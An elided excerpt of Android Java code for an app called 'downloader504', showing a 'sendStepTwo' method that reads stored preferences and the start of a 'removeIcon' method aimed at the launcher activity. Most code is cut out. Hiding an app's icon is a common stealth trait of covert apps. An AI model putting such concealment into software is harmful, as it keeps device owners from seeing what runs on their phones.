package ir.website.downloader504;
...
public class Utility {
    ...
    public static Boolean sendStepTwo() {
        ...
        SharedPreferences settings = OSService.context.getSharedPreferences("downloader504", Context.MODE_PRIVATE);
...
//                connection.setRequestProperty("If-Range", lastModified);
    ...
    public static Boolean removeIcon(){
        try {
            ...
            ComponentName componentName = new ComponentName("ir.website.downloader504", "ir.website.downloader504.MainActivity"); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
